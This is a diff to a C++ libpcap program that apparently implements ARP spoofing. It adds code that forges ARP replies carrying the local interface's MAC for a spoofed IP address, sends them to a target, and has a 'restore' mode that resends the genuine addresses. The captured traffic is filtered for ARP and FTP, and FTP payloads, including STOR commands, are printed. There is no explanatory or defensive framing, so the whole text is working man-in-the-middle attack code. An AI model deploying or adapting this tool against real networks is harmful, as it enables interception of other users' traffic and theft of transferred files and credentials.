@@ -6,24 +6,27 @@ Pcap::Pcap(const char *ip_src, const char *mac_src,
 		_ip_target(ip_target), _mac_target(mac_target),
 		_interface(interface) {
 	std::cout << "Pcap Created" <<std::endl;
-	this->_ip_select = NULL;
-	this->_mac_select = NULL;
-	//this->_pcap_list = NULL;
+	//this->_ip_select = NULL;
+	//this->_mac_select = NULL;
+	this->_pcap_list = NULL;
 	//this->_device_select = NULL;
 	this->_device_capture = NULL;
 	this->_fp = NULL;
 	this->_netmask = 0;
+	this->_sll_halen = 0;
+	this->_sll_addr = NULL;
+	memset(this->_buf, 0, sizeof(this->_buf));
 }
 
 /*
  * Clear pcap allocation
  */
 Pcap::~Pcap() {
-	//if (this->_pcap_list)
-	//	pcap_freealldevs(this->_pcap_list);
+	if (this->_pcap_list)
+		pcap_freealldevs(this->_pcap_list);
 	if (this->_device_capture) {
 		pcap_close(this->_device_capture);
-		g_pcap = NULL;
+		g_pcap_t = NULL;
 	}
 	if (this->_fp) {
 		pcap_freecode(this->_fp);
@@ -202,10 +205,49 @@ int	Pcap::setTimeout(pcap_t *src, int to_ms) const {
 	return pcap_set_timeout(src, to_ms);
 }
 
+int	Pcap::setSelfMac() {
+	char errbuf[PCAP_ERRBUF_SIZE] = {0};
+	int res = pcap_findalldevs(&this->_pcap_list, errbuf);
+
+	if (res) {
+		return res;
+	}
+	struct sockaddr_ll *ethernet = NULL;
+	pcap_if_t *list_search = this->_pcap_list;
+	pcap_addr *addr_list = NULL;
+
+	while (list_search) {
+		addr_list = list_search->addresses;
+		if (list_search->name == this->_interface) {
+			while (addr_list) {
+				if (addr_list && addr_list->addr
+					&& addr_list->addr->sa_family == AF_PACKET) {
+					ethernet = reinterpret_cast<sockaddr_ll *>(addr_list->addr);
+					printf("hl:%d\n", ethernet->sll_halen);
+					break ;
+				}
+				addr_list = addr_list->next;
+			}
+		}
+		list_search = list_search->next;
+		if (ethernet)
+			break ;
+	}
+	list_search = NULL;
+	addr_list = NULL;
+	if (ethernet) {
+		this->_sll_halen = ethernet->sll_halen;
+		this->_sll_addr = ethernet->sll_addr;
+		return 0;
+	}
+	return 1;
+}
+
+
 int	Pcap::activateCapture(pcap_t *src) const {
 	return pcap_activate(this->_device_capture);
 }
-#include <cstring>
+
 int	Pcap::compileFilterArp(pcap_t *src)
 {
 	if (!src)// || !this->_device_select)
@@ -220,7 +262,7 @@ int	Pcap::compileFilterArp(pcap_t *src)
 	if (!this->_fp)
 		return 1;
 	memset(this->_fp, 0, sizeof(struct bpf_program));
-	return pcap_compile(src, this->_fp, "arp or port ftp", 0, this->_netmask);
+	return pcap_compile(src, this->_fp, "arp or port 20", 0, this->_netmask);
 }
 
 int	Pcap::setFilter(pcap_t *src, struct bpf_program *fp) const {
@@ -296,6 +338,7 @@ static void handle_ftp(const u_char *bytes, bpf_u_int32 len){
 		= reinterpret_cast<const unsigned char *>(bytes + size);
 	std::string fill_cmp((const char *)ftp_bytes);
 
+	std::cout <<"ftp: " << fill_cmp << std::endl;
 	if (ftp_bytes) {
 		len -= size;
 		if (!fill_cmp.find("STOR")
@@ -337,6 +380,11 @@ int	Pcap::loopPcap(pcap_t *src) {
 	return res;
 }
 
+int	Pcap::sendPacket() const {
+	return pcap_sendpacket(this->_device_capture,
+		(const u_char *)this->_buf, sizeof(this->_buf));
+}
+
 /*
  * Fill pointer address from std::string
  */
@@ -360,19 +408,26 @@ void convAddress(const std::string &src, uint8_t *addr,
 	addr[i] = std::stoi(substr, NULL, base);
 }
 
+
+
 /*
  * Forge Ethernet and ARP packet
  */
-void	Pcap::forgePacket(char *buf, int len) {
-	if (!buf)
-		return ;
+void	Pcap::forgePacket(bool restore) {
 	struct ether_header eth;
 	struct	ether_arp arp;
 
+	memset(this->_buf, 0, sizeof(this->_buf));
 	memset(&eth, 0, sizeof(struct ether_header));
 	memset(&arp, 0, sizeof(struct ether_arp));
 	convAddress(this->_mac_target, eth.ether_dhost, ':', ETH_HLEN, 16);
-	convAddress(this->_mac_src, eth.ether_shost, ':', ETH_HLEN, 16);
+	if (!restore && this->_sll_addr) {
+		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
+			eth.ether_shost[i] = this->_sll_addr[i];
+		}
+	} else {
+		convAddress(this->_mac_src, eth.ether_shost, ':', ETH_HLEN, 16);
+	}
 	eth.ether_type = htons(0x0806);
 	arp.ea_hdr.ar_hrd = htons(1);
 	arp.ea_hdr.ar_pro = htons(0x0800);
@@ -381,9 +436,15 @@ void	Pcap::forgePacket(char *buf, int len) {
 	arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
 	convAddress(this->_mac_target, arp.arp_tha, ':', ETH_ALEN, 16);
 	convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
-	convAddress(this->_mac_src, arp.arp_sha, ':', ETH_ALEN, 16);
+	if (!restore && this->_sll_addr) {
+		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
+			arp.arp_sha[i] = this->_sll_addr[i];
+		}
+	}
+	else {
+		convAddress(this->_mac_src, arp.arp_sha, ':', ETH_ALEN, 16);
+	}
 	convAddress(this->_ip_src, arp.arp_spa, '.', 4, 10);
-	memcpy(buf, &eth, sizeof(struct ether_header));
-	memcpy(buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
-
+	memcpy(this->_buf, &eth, sizeof(struct ether_header));
+	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
 }
